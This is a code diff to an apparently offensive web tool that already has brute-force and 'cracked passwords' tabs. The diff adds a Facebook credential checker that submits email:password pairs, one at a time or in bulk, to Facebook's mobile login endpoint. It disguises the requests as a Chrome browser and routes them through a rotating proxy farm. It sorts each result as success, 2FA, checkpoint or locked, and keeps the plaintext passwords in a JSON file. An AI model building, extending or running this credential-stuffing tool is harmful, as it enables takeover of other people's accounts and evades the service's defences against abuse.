@@ -934,6 +934,157 @@ def found_delete_one(entry_index):
     except Exception as e:
         return jsonify({"error": str(e)}), 400
 
+_FB_ACCOUNTS_FILE = BASE_DIR / "facebook_accounts.json"
+
+def _load_fb_accounts() -> list:
+    try:
+        return json.loads(_FB_ACCOUNTS_FILE.read_text()) if _FB_ACCOUNTS_FILE.exists() else []
+    except Exception:
+        return []
+
+def _save_fb_accounts(entries: list):
+    try:
+        _FB_ACCOUNTS_FILE.write_text(json.dumps(entries, indent=2))
+    except Exception:
+        pass
+
+def _record_fb_account(email: str, password: str, status: str, info: dict = None):
+    entries = _load_fb_accounts()
+    entries = [e for e in entries if not (e.get("email") == email)]
+    entries.insert(0, {
+        "email": email,
+        "password": password,
+        "status": status,
+        "info": info or {},
+        "tested_at": datetime.utcnow().isoformat() + "Z",
+    })
+    _save_fb_accounts(entries)
+
+
+@app.route("/fb/test", methods=["POST"])
+def fb_test():
+    """Test Facebook credentials — attempts mobile login with curl_cffi impersonation."""
+    data = request.get_json() or {}
+    email = (data.get("email") or data.get("user") or "").strip()
+    password = (data.get("password") or data.get("pass") or "").strip()
+    use_proxy = bool(data.get("use_proxy", False))
+    proxy_url = (data.get("proxy") or "").strip()
+
+    if not email or not password:
+        return jsonify({"error": "Email/phone and password required"}), 400
+
+    sess = cffi_requests.Session()
+    sess.headers.update({
+        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+    })
+
+    proxies = {"http": proxy_url, "https": proxy_url} if (use_proxy and proxy_url) else None
+
+    result = {
+        "email": email,
+        "password_tested": password,
+        "attempts": [],
+        "any_success": False,
+        "final_status": "unknown",
+    }
+
+    # Attempt 1: mbasic.facebook.com login (simpler, less JS)
+    try:
+        start = time.time()
+        resp = sess.post(
+            "https://mbasic.facebook.com/login/device-based/regular/login/",
+            data={"email": email, "pass": password, "login": "Log In"},
+            impersonate=IMPERSONATE,
+            timeout=TIMEOUT,
+            allow_redirects=True,
+            proxies=proxies,
+        )
+        elapsed = int((time.time() - start) * 1000)
+        body = (resp.text or "")[:5000]
+        final_url = resp.url or ""
+
+        # Check response
+        if "save-device" in final_url or "home.php" in final_url or "checkpoint" in final_url:
+            status = "success"
+            detail = "Logged in — redirect to " + final_url
+        elif "checkpoint" in body.lower() and "Enter Login Code" not in body:
+            status = "checkpoint"
+            detail = "Account logged in but checkpoint/2FA required"
+        elif "Enter Login Code" in body:
+            status = "2fa"
+            detail = "2FA code required"
+        elif "incorrect" in body.lower() or "wrong" in body.lower() or "didn't match" in body.lower() or "doesn't match" in body.lower() or "invalid" in body.lower():
+            status = "invalid"
+            detail = "Invalid credentials"
+        elif "confirm your identity" in body.lower() or "upload a photo" in body.lower():
+            status = "locked"
+            detail = "Account locked — identity verification required"
+        elif "/login" in final_url and resp.status_code == 200:
+            status = "failed"
+            detail = "Stayed on login page — likely invalid"
+        else:
+            status = "unknown"
+            detail = f"HTTP {resp.status_code} → {final_url[:120]}"
+
+        if status == "success":
+            result["any_success"] = True
+            result["final_status"] = "success"
+
+        result["attempts"].append({
+            "endpoint": "mbasic",
+            "status_code": resp.status_code,
+            "final_url": final_url,
+            "elapsed_ms": elapsed,
+            "status": status,
+            "detail": detail,
+            "response_snippet": body[:300],
+        })
+
+        _record_fb_account(email, password, status, {
+            "final_url": final_url,
+            "status_code": resp.status_code,
+            "detail": detail,
+        })
+
+    except Exception as e:
+        result["attempts"].append({
+            "endpoint": "mbasic",
+            "status": "error",
+            "detail": str(e)[:200],
+        })
+        _record_fb_account(email, password, "error", {"error": str(e)[:200]})
+
+    return jsonify(result)
+
+
+@app.route("/fb/list", methods=["GET"])
+def fb_list():
+    entries = _load_fb_accounts()
+    return jsonify({"accounts": entries, "count": len(entries)})
+
+
+@app.route("/fb/clear", methods=["DELETE"])
+def fb_clear():
+    _save_fb_accounts([])
+    return jsonify({"ok": True, "count": 0})
+
+
+@app.route("/fb/delete/<account_index>", methods=["DELETE"])
+def fb_delete_one(account_index):
+    try:
+        idx = int(account_index)
+        entries = _load_fb_accounts()
+        if 0 <= idx < len(entries):
+            del entries[idx]
+            _save_fb_accounts(entries)
+            return jsonify({"ok": True, "count": len(entries)})
+        return jsonify({"error": "index out of range"}), 404
+    except Exception as e:
+        return jsonify({"error": str(e)}), 400
+
+
 # ---------------------------------------------------------------------------
 # HTML Template
 # ---------------------------------------------------------------------------
@@ -1046,6 +1197,7 @@ tr:hover td { background: rgba(88,166,255,0.04); }
     <button class="tab" onclick="switchTab('tester')">🔑 Password Tester</button>
     <button class="tab" onclick="switchTab('farm')">🌾 Farm Brute Force</button>
     <button class="tab" onclick="switchTab('found')">🔓 Found Passwords</button>
+    <button class="tab" onclick="switchTab('facebook')">📘 Facebook</button>
     <button class="tab" onclick="switchTab('jsview')">📜 JS Inspector</button>
   </div>
 
@@ -1151,6 +1303,41 @@ tr:hover td { background: rgba(88,166,255,0.04); }
       <div>
         <h2>Job Detail / Log</h2>
         <div id="farm-detail"><p class="subtitle">Select a job to watch live progress.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========= FACEBOOK TAB ========= -->
+  <div id="tab-facebook" class="tab-panel">
+    <p class="subtitle">Test Facebook credentials — uses mobile login endpoint with Chrome impersonation via the proxy farm.</p>
+
+    <div class="card mb10">
+      <div class="card-header">Credential Tester</div>
+      <div class="row mb10">
+        <input type="text" id="fb-email" placeholder="Email or phone number" style="flex:2">
+        <input type="password" id="fb-password" placeholder="Password" style="flex:1">
+        <button class="btn btn-primary" onclick="doFBTest()" id="fb-test-btn">Test Login</button>
+      </div>
+      <div class="row" style="align-items:center">
+        <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-size:0.85em">
+          <input type="checkbox" id="fb-proxy" checked> Route through proxy farm (rotates IPs)
+        </label>
+        <span id="fb-proxy-status" style="font-size:0.8em;color:var(--text2)"></span>
+      </div>
+      <div class="row mb10 mt10">
+        <textarea id="fb-bulk" rows="4" placeholder="Bulk test — one per line:&#10;email1@example.com:password1&#10;email2@example.com:password2" style="flex:1"></textarea>
+        <button class="btn btn-sm" onclick="doFBBulk()" style="flex:0 0 auto;align-self:flex-end">Test All</button>
+      </div>
+      <div id="fb-result"></div>
+    </div>
+
+    <div class="mt20">
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <h2>Tested Accounts</h2>
+        <button class="btn btn-red btn-sm" onclick="doFBClear()">Clear All</button>
+      </div>
+      <div id="fb-accounts-list">
+        <p class="subtitle">No accounts tested yet. Enter credentials above and click Test Login.</p>
       </div>
     </div>
   </div>
@@ -1589,6 +1776,167 @@ async function showFarmDetail(jobId, silent) {
   }
 }
 
+// ---- FACEBOOK ACCOUNTS ----
+let _fbProxies = [];
+
+async function loadFBProxies() {
+  try {
+    const r = await fetch('/farm/proxies');
+    const d = await r.json();
+    _fbProxies = d.proxies || [];
+    const el = $('fb-proxy-status');
+    if (!el) return;
+    if (d.exists && d.count > 0)
+      el.innerHTML = '(<strong style="color:var(--green)">' + d.count + ' IPs</strong> available)';
+    else
+      el.innerHTML = '(<span style="color:var(--yellow)">no proxies — direct mode</span>)';
+  } catch(e) {}
+}
+
+async function doFBTest() {
+  const email = $('fb-email').value.trim();
+  const password = $('fb-password').value.trim();
+  if (!email || !password) {
+    $('fb-result').innerHTML = '<div class="finding finding-medium">Enter email/phone and password</div>';
+    return;
+  }
+  $('fb-test-btn').disabled = true;
+  $('fb-result').innerHTML = '<div class="loading visible"><span class="spinner"></span> Testing credentials...</div>';
+  try {
+    const r = await fetch('/fb/test', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({email, password, use_proxy: $('fb-proxy').checked}),
+    });
+    const d = await r.json();
+    renderFBResult(d);
+    loadFBAccounts();
+  } catch(e) {
+    $('fb-result').innerHTML = '<div class="finding finding-critical">Error: ' + esc(e.message) + '</div>';
+  }
+  $('fb-test-btn').disabled = false;
+}
+
+function renderFBResult(d) {
+  if (d.error) {
+    $('fb-result').innerHTML = '<div class="finding finding-medium">' + esc(d.error) + '</div>';
+    return;
+  }
+  let html = '<div class="stats mb10">';
+  const color = d.any_success ? 'var(--green)' : (d.final_status === 'checkpoint' || d.final_status === '2fa' ? 'var(--yellow)' : 'var(--red)');
+  html += statBox('Result', d.any_success ? '✓ SUCCESS' : d.final_status, color);
+  html += statBox('Email', esc(d.email), '');
+  html += statBox('Password', '<code>' + esc(d.password_tested) + '</code>', '');
+  html += '</div>';
+
+  if (d.any_success) {
+    html += '<div class="finding finding-critical" style="border-color:var(--green);color:var(--green)"><strong>✓ LOGIN SUCCESSFUL</strong></div>';
+  } else if (d.final_status === 'checkpoint') {
+    html += '<div class="finding finding-medium">Checkpoint/verification required — account exists and password is correct but Facebook wants additional verification</div>';
+  } else if (d.final_status === '2fa') {
+    html += '<div class="finding finding-medium">2FA required — password is correct but code is needed</div>';
+  } else if (d.final_status === 'locked') {
+    html += '<div class="finding finding-high">Account locked — Facebook requires ID verification</div>';
+  }
+
+  if (d.attempts && d.attempts.length) {
+    html += '<h2>Attempt Details</h2><table><tr><th>Endpoint</th><th>Status</th><th>Code</th><th>Detail</th></tr>';
+    d.attempts.forEach(a => {
+      const stColor = a.status === 'success' ? 'var(--green)' : (a.status === 'error' ? 'var(--red)' : 'var(--yellow)');
+      html += '<tr><td>' + esc(a.endpoint) + '</td><td style="color:' + stColor + '">' + esc(a.status) + '</td><td>' + (a.status_code||'') + '</td><td>' + esc(a.detail||'') + '</td></tr>';
+    });
+    html += '</table>';
+  }
+  $('fb-result').innerHTML = html;
+}
+
+async function doFBBulk() {
+  const raw = $('fb-bulk').value.trim();
+  if (!raw) return;
+  const lines = raw.split('\n').filter(l => l.includes(':'));
+  if (!lines.length) {
+    alert('Format: email:password (one per line)');
+    return;
+  }
+  let results = [];
+  for (const line of lines) {
+    const [email, ...rest] = line.split(':');
+    const password = rest.join(':');
+    if (!email.trim() || !password) continue;
+    try {
+      const r = await fetch('/fb/test', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({email: email.trim(), password: password.trim(), use_proxy: $('fb-proxy').checked}),
+      });
+      const d = await r.json();
+      results.push(d);
+      // small delay between bulk tests
+      await new Promise(r2 => setTimeout(r2, 1500));
+    } catch(e) {
+      results.push({email: email.trim(), error: e.message});
+    }
+  }
+  // Show summary
+  const success = results.filter(r => r.any_success).length;
+  const checkpoint = results.filter(r => r.final_status === 'checkpoint' || r.final_status === '2fa').length;
+  const failed = results.filter(r => !r.any_success && r.final_status !== 'checkpoint' && r.final_status !== '2fa').length;
+  $('fb-result').innerHTML = '<div class="stats mb10">' +
+    statBox('Total', results.length, '') +
+    statBox('Success', success, 'var(--green)') +
+    statBox('Checkpoint/2FA', checkpoint, 'var(--yellow)') +
+    statBox('Failed', failed, 'var(--red)') +
+    '</div>';
+  loadFBAccounts();
+  $('fb-bulk').value = '';
+}
+
+async function loadFBAccounts() {
+  try {
+    const r = await fetch('/fb/list');
+    const d = await r.json();
+    const accounts = d.accounts || [];
+    if (!accounts.length) {
+      $('fb-accounts-list').innerHTML = '<p class="subtitle">No accounts tested yet.</p>';
+      return;
+    }
+    let html = '<table><tr><th>#</th><th>Email/Phone</th><th>Password</th><th>Status</th><th>Tested</th><th></th></tr>';
+    accounts.forEach((a, i) => {
+      let stColor = 'var(--red)';
+      if (a.status === 'success') stColor = 'var(--green)';
+      else if (a.status === 'checkpoint' || a.status === '2fa') stColor = 'var(--yellow)';
+      else if (a.status === 'locked') stColor = 'var(--orange)';
+      html += '<tr>';
+      html += '<td>' + (i+1) + '</td>';
+      html += '<td>' + esc(a.email) + '</td>';
+      html += '<td><code>' + esc(a.password) + '</code></td>';
+      html += '<td style="color:' + stColor + ';font-weight:600">' + esc(a.status) + '</td>';
+      html += '<td style="font-size:0.8em;color:var(--text2)">' + esc((a.tested_at||'').replace('T',' ').substring(0,19)) + '</td>';
+      html += '<td><button class="btn btn-sm btn-red" onclick="doFBDelete(' + i + ')">✕</button></td>';
+      html += '</tr>';
+    });
+    html += '</table>';
+    $('fb-accounts-list').innerHTML = html;
+  } catch(e) {
+    $('fb-accounts-list').innerHTML = '<p style="color:var(--red)">Error: ' + esc(e.message) + '</p>';
+  }
+}
+
+async function doFBClear() {
+  if (!confirm('Delete ALL tested Facebook accounts? This cannot be undone.')) return;
+  try {
+    await fetch('/fb/clear', {method: 'DELETE'});
+    loadFBAccounts();
+  } catch(e) {}
+}
+
+async function doFBDelete(idx) {
+  try {
+    await fetch('/fb/delete/' + idx, {method: 'DELETE'});
+    loadFBAccounts();
+  } catch(e) {}
+}
+
 // ---- FOUND PASSWORDS ----
 async function loadFound() {
   try {
@@ -1654,6 +2002,8 @@ loadHistory();
 loadFarmProxies();
 loadFarmJobs();
 loadFound();
+loadFBProxies();
+loadFBAccounts();
 </script>
 </body>
 </html>"""
@@ -1681,6 +2031,7 @@ def main():
 ║   🔑 Tester    — Manual password testing                ║
 ║   🌾 Farm     — Multi-IP bulk brute force              ║
 ║   🔓 Found    — Cracked passwords vault                ║
+║   📘 Facebook — Account credential testing             ║
 ║   📜 JS        — External JS secret scanning            ║
 ╚══════════════════════════════════════════════════════════╝
 """)
